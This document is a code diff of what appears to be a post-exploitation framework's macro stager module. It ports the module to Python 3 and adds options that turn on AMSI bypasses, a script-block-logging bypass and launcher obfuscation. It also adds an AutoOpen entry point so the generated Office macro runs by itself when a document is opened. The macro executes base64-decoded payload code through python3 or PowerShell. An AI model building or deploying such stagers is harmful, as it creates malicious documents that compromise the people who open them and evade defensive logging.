@@ -1,7 +1,11 @@
+from __future__ import print_function
+from builtins import str
+from builtins import range
+from builtins import object
 from lib.common import helpers
 import re
 
-class Stager:
+class Stager(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -68,6 +72,31 @@ class Stager:
                 'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                 'Required'      :   False,
                 'Value'         :   'default'
+            },
+            'ScriptLogBypass' : {
+                'Description'   :   'Include cobbr\'s Script Block Log Bypass in the stager code.',
+                'Required'      :   False,
+                'Value'         :   'True'
+            },
+            'Obfuscate': {
+                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
+                'Required': False,
+                'Value': 'False'
+            },
+            'ObfuscateCommand': {
+                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
+                'Required': False,
+                'Value': r'Token\All\1'
+            },
+            'AMSIBypass' : {
+                'Description'   :   'Include mattifestation\'s AMSI Bypass in the stager code.',
+                'Required'      :   False,
+                'Value'         :   'True'
+            },
+            'AMSIBypass2' : {
+                'Description'   :   'Include Tal Liberman\'s AMSI Bypass in the stager code.',
+                'Required'      :   False,
+                'Value'         :   'False'
             }
         }
 
@@ -88,7 +117,7 @@ class Stager:
             str1 = ''
             str2 = ''
             str1 = varstr + ' = "' + instr[:54] + '"'
-            for i in xrange(54, len(instr), 48):
+            for i in range(54, len(instr), 48):
                 holder.append('\t\t' + varstr + ' = '+ varstr +' + "'+instr[i:i+48])
                 str2 = '"\r\n'.join(holder)
             str2 = str2 + "\""
@@ -98,18 +127,39 @@ class Stager:
         # extract all of our options
         language = self.options['Language']['Value']
         listenerName = self.options['Listener']['Value']
+        obfuscate = self.options['Obfuscate']['Value']
+        obfuscateCommand = self.options['ObfuscateCommand']['Value']
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
         stagerRetries = self.options['StagerRetries']['Value']
         safeChecks = self.options['SafeChecks']['Value']
         pixelTrackURL = self.options['PixelTrackURL']['Value']
+        scriptLogBypass = self.options['ScriptLogBypass']['Value']
+        AMSIBypass = self.options['AMSIBypass']['Value']
+        AMSIBypass2 = self.options['AMSIBypass2']['Value']
+
+        invokeObfuscation = False
+        if obfuscate.lower() == "true":
+            invokeObfuscation = True
+
+        scriptLogBypassBool = False
+        if scriptLogBypass.lower() == "true":
+            scriptLogBypassBool = True
+
+        AMSIBypassBool = False
+        if AMSIBypass.lower() == "true":
+            AMSIBypassBool = True
+
+        AMSIBypass2Bool = False
+        if AMSIBypass2.lower() == "true":
+            AMSIBypass2Bool = True
 
         # generate the python launcher code
         pylauncher = self.mainMenu.stagers.generate_launcher(listenerName, language="python", encode=True, userAgent=userAgent, safeChecks=safeChecks)
 
         if pylauncher == "":
-            print helpers.color("[!] Error in python launcher command generation.")
+            print(helpers.color("[!] Error in python launcher command generation."))
             return ""
 
         # render python launcher into python payload
@@ -118,16 +168,17 @@ class Stager:
             pypayload = formStr("str", match)
 
         # generate the powershell launcher code
-        poshlauncher = self.mainMenu.stagers.generate_launcher(listenerName, language="powershell", encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries)
+        poshlauncher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True, obfuscate=invokeObfuscation, obfuscationCommand=obfuscateCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries, safeChecks=safeChecks, scriptLogBypass=scriptLogBypassBool, AMSIBypass=AMSIBypassBool, AMSIBypass2=AMSIBypass2Bool)
 
         if poshlauncher == "":
-            print helpers.color("[!] Error in powershell launcher command generation.")
+            print(helpers.color("[!] Error in powershell launcher command generation."))
             return ""
 
         # render powershell launcher into powershell payload
         poshchunks = list(helpers.chunks(poshlauncher, 50))
         poshpayload = "Dim Str As String"
         poshpayload += "\n\t\tstr = \"" + str(poshchunks[0])
+
         for poshchunk in poshchunks[1:]:
             poshpayload += "\n\t\tstr = str + \"" + str(poshchunk)
 
@@ -139,6 +190,11 @@ class Stager:
         Private Declare Function system Lib "libc.dylib" (ByVal command As String) As Long
     #End If
 #End If
+
+Sub AutoOpen()
+    'MsgBox("AutoOpen()")
+    Debugging
+End Sub
 
 Sub Auto_Open()
     'MsgBox("Auto_Open()")
@@ -164,8 +220,8 @@ Public Function Debugging() As Variant
                 Dim result As Long
                 Dim str As String
                 %s
-                'MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & str & \" \\\"\"));"" | /usr/bin/python &")
-                result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & str & \" \\\"\"));"" | /usr/bin/python &")
+                'MsgBox("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & str & \" \\\"\"));"" | python3 &")
+                result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & str & \" \\\"\"));"" | python3 &")
             #Else
                 'Windows Rendering
                 Dim objWeb As Object
